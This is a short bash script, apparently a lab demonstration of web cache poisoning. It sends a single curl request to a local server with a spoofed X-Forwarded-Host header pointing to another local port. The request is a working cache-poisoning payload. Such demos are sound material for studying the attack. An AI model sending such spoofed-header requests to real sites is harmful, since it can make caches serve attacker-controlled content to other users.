#!/bin/bash
# =============================================================
# Cache Poisoning Attack Demo — Fixed Version
# =============================================================

curl -s -H "X-Forwarded-Host: localhost:8081" http://localhost:80/